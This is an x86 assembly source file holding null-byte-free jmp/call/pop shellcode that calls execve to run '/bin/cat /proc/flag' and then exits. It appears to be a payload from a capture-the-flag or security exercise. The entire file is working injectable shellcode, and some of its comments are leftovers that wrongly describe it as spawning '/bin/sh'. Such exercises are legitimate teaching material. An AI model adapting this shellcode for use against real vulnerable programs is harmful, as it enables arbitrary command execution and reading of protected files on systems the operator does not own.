#include <sys/syscall.h>

#define STRING  "/bin/catN/proc/flag"
#define STRLEN0 8
#define STRLEN1 10
#define ARGV    (STRLEN0 + 1 + STRLEN1 + 1)
#define ARGV1   (ARGV+4)
#define ENVP    (ARGV+8)

.intel_syntax noprefix
.text
    
.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  pop    esi                    /* esi points to STRING */
  mov    [ARGV + esi],esi         /* set up argv[0] pointer to pathname */
  xor    eax,eax                /* get a 32-bit zero value */
  mov    [STRLEN0 + esi],al      /* null-terminate our string */

  lea    eax,[esi + 9]       /* arg 2: argv */
  mov    [ARGV1 + esi],eax      /* set up argv[0] pointer to pathname */
  xor    eax,eax                /* get a 32-bit zero value */
  mov    [STRLEN0 + 1 + STRLEN1 + esi],al      /* null-terminate our string */

  xor    eax,eax                /* get a 32-bit zero value */
  mov    [ENVP + esi], eax      /* set up null envp */
  
  mov    al,SYS_execve          /* syscall number */
  mov    ebx,esi                /* arg 1: string pathname */
  lea    ecx,[ARGV + esi]       /* arg 2: argv */
  lea    edx,[ENVP + esi]       /* arg 3: envp */
  int    0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */
  
  xor    ebx,ebx                /* arg 1: 0 */
  mov    eax,ebx
  inc    eax                    /* exit(0) */
  /* mov+inc to avoid null byte */
  int    0x80                   /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING
